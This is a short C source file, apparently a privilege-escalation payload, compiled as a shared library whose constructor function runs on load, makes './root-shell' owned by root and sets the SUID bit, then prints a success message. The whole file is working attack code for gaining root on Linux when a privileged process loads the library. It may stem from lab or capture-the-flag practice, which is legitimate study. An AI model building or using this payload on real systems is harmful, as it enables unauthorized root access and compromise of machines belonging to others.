// gcc -fPIC -shared -o drop-shell drop-shell.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

// https://gcc.gnu.org/onlinedocs/gcc-4.7.0/gcc/Function-Attributes.html
__attribute__((__constructor__))

void dropshell(void) {
    // Set root user to be owner, and SUID permission
    chown("./root-shell", 0, 0);
    chmod("./root-shell", 04755);

    // Feedback
    printf("[+] Done!\n");
}
